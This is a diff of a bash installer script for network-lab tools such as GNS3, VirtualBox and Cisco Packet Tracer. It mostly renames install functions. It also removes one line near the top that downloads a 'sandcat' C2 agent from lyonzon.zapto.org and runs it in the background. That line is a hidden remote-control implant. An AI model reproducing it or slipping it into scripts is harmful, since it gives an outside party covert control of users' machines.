@@ -2,7 +2,6 @@
 #resources:
 #https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies?tab=readme-ov-file
 # libraries for Cisco Packet Tracer
-server="http://lyonzon.zapto.org:8888";agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;nohup ./$agent -server $server &
 #wget https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb
 #wget https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libgl1-mesa-glx_23.0.4-0ubuntu1.22.04.1_amd64.deb
 # Update the system
@@ -35,7 +34,7 @@ print_message() {
     local color=$2
     echo -e "${color}${message}${NC}"
 }
-install_program1() {
+install_GNS3() {
     # Install GNS3
     echo -n "Installing GNS3..."
     (sleep 3) &
@@ -51,7 +50,7 @@ install_program1() {
     print_message "Done!" $GREEN
 }
 # Function to install program 2
-install_program2() {
+install_VMWARE() {
     echo -n "Installing Vmware..."
     (sleep 3) &
     spinner $!
@@ -61,7 +60,7 @@ install_program2() {
     print_message "Done!" $GREEN
 }
 # Function to install program 3
-install_program3() {
+install_VIRTUALBOX() {
     echo -n "Installing Virtualbox..."
     (sleep 3) &
     spinner $!
@@ -72,7 +71,7 @@ install_program3() {
     print_message "Done!" $GREEN
 }
 
-install_program4() {
+install_PACKET-TRACER() {
     echo -n "downloading dependencies Installing PakcetTracer..."
     wget "https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb"
     wget "https://github.com/PetrusNoleto/Error-in-install-cisco-packet-tracer-in-ubuntu-23.10-unmet-dependencies/releases/download/CiscoPacketTracerFixUnmetDependenciesUbuntu23.10/libegl1-mesa_23.0.4-0ubuntu1.22.04.1_amd64.deb"
@@ -96,7 +95,7 @@ install_program4() {
     print_message "System update, package installation, and cleanup completed." $GREEN
 }
 
-install_program5() {
+install_WARP-VPN() {
     echo -n "Installing warp ..."
     (sleep 3) &
     spinner $!
@@ -210,7 +209,7 @@ read -p "first perform update with all dependicies needed or skip to the next pa
 if [[ $answer1 == "y" ]]; then
 	sudo apt update -y 
 	sudo apt upgrade -y
-	sudo apt install -y build-essential git curl wget software-properties-common
+	sudo apt install -y build-essential git openvpn base64 curl wget software-properties-common
 	sudo apt install gdebi -y 
 fi 
 echo "----------------------------- PART 2 ------------------------------------------------- "
@@ -222,11 +221,11 @@ read -p "Enter the program numbers (e.g., 1 2 3): " selected_programs
 # Iterate over the selected program numbers and call the corresponding functions
 for program_number in $selected_programs; do
     case $program_number in
-        1) install_program1 ;;
-        2) install_program2 ;;
-        3) install_program3 ;;
-        4) install_program4 ;;
-        5) install_program5 ;;
+        1) install_GNS3 ;;
+        2) install_VMWARE ;;
+        3) install_VIRTUALBOX ;;
+        4) install_PACKET-TRACER ;;
+        5) install_WARP-VPN ;;
         6) fix_packettracer ;;
         *) echo "Invalid program number: $program_number";;
     esac
